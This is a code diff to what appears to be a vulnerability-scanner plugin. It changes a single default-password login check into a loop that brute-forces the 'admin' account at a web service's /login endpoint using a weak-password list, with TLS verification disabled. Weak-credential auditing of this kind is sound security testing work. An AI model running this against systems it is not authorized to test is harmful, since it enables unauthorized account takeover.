@@ -9,7 +9,7 @@
 '''
 
 from lib.utils.http import request, get_schemed_url, urljoin_ex
-from lib.core.data import logger
+from lib.core.data import paths, logger
 
 
 def _get_post_data(pwd="admin"):
@@ -21,13 +21,7 @@ def _get_post_data(pwd="admin"):
     return post_data
 
 
-def poc(url):
-    url = get_schemed_url(url)
-    login_url = urljoin_ex(url, "/login")
-
-    # 1
-    post_data = _get_post_data()
-    resp = request("POST", login_url, json=post_data, verify=0, timeout=15)
+def _is_valid_login(resp):
     if not resp:
         return False
 
@@ -35,5 +29,32 @@ def poc(url):
         return False
 
     else:
-        logger.info(resp.text)
         return True
+
+
+def login_by_url_and_pwd(login_url, pwd):
+    post_data = _get_post_data(pwd)
+    resp = request("POST", login_url, json=post_data, verify=0, timeout=15)
+    if _is_valid_login(resp):
+        msg = "%s, admin/%s, %s second" % (login_url, "admin", resp.elapsed.total_seconds())
+        logger.info(msg)
+        return True
+    else:
+        return False
+
+
+def poc(url):
+    url = get_schemed_url(url)
+    login_url = urljoin_ex(url, "/login")
+
+    with open(paths.WEAK_PASS_10, "r") as f:
+        pwd_list = f.readlines()
+    for pwd in pwd_list:
+        valid = login_by_url_and_pwd(login_url, pwd)
+        if valid:
+            return True
+        else:
+            continue
+
+    # fail when finished
+    return False
